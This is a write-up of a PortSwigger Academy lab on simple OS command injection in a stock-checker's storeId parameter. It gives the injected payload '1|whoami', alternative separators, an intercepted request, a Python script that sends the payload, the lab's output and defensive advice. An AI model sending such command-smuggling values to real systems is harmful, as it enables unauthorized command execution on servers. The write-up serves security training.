# Lab: OS command injection, simple case (Apprentice)

**PortSwigger:** [Official lab](https://portswigger.net/web-security/os-command-injection/lab-simple)

**Description:** The product stock checker runs a shell command containing user-supplied product and store IDs and returns the raw command output in the response.

**Goal:** Execute `whoami` to determine the name of the current user.

**Vulnerable parameter:** `storeId` in `POST /product/stock`.

## Vulnerability

The stock check builds a shell command from the submitted IDs, roughly:

```bash
stockreport.pl <productId> <storeId>
```

Neither parameter is sanitised, and the command's stdout is returned to the browser, so this is a *non-blind* injection: the output comes straight back.

## Solution

1. Open any product, e.g. `/product?productId=1`, and click **Check stock**.
2. Intercept the request:

```http
POST /product/stock HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

productId=1&storeId=1
```

3. Append a command separator and your command to `storeId`:

```
productId=1&storeId=1|whoami
```

4. The response body now contains the username instead of a stock count, and the lab is solved.

## Exploit Payload

```
1|whoami
```

Other separators that work in this lab: `1;whoami`, `1&whoami`, `1&&whoami`, `` 1|`whoami` ``.

## Python one-liner (optional)

```python
import requests
url = "https://YOUR-LAB-ID.web-security-academy.net/product/stock"
r = requests.post(url, data={"productId": "1", "storeId": "1|whoami"})
print(r.text)
```

Full automation: [`os_command_injection_simple_case.py`](os_command_injection_simple_case.py).

## Verified run

Instance `0ab000ad031340de8079ad1d008b006b` returned:

```
peter-yiUkmF
```

## Defensive takeaways

Look up stock levels through an API/argument array rather than a shell string, and validate that `productId`/`storeId` are integers before use. Returning raw command output to the client turns any injection into an immediate, fully readable compromise.
